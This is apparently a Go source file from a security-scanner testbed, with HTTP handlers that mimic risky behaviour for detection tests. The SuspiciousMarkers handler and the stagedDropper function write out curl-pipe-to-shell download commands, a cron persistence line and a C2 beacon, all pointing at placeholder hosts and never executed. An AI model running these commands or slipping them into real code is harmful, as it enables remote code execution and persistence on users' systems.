package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/reachable/reach-testbed-github-go/internal/safety"
)

// Static trusted tool endpoints keyed by hostname. Fetch uses these constants,
// never the caller-supplied URL string, so the sink is not request-derived.
var allowedFetchURLs = map[string]string{
	"example.invalid":       "https://example.invalid/tool.bin",
	"downloads.example.com": "https://downloads.example.com/tool.bin",
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := strings.TrimSpace(r.URL.Query().Get("url"))
	parsed, err := url.Parse(source)
	if err != nil || !parsed.IsAbs() || parsed.Hostname() == "" {
		http.Error(w, "invalid url", http.StatusBadRequest)
		return
	}
	if parsed.Scheme != "https" {
		http.Error(w, "https scheme required", http.StatusBadRequest)
		return
	}
	host := strings.ToLower(parsed.Hostname())
	if !safety.AllowedHostname(host) {
		http.Error(w, "host not allowed", http.StatusBadRequest)
		return
	}
	staticURL, ok := allowedFetchURLs[host]
	if !ok {
		http.Error(w, "url not allowlisted", http.StatusBadRequest)
		return
	}

	// Local safe adapter: stage a fixture for allowlisted tools; no outbound http.Get.
	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: create %q failed: %v", target, err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	payload := []byte("reach-testbed-local-tool\nsource=" + staticURL + "\n")
	if _, err := out.Write(payload); err != nil {
		log.Printf("FetchTool: write %q failed: %v", target, err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
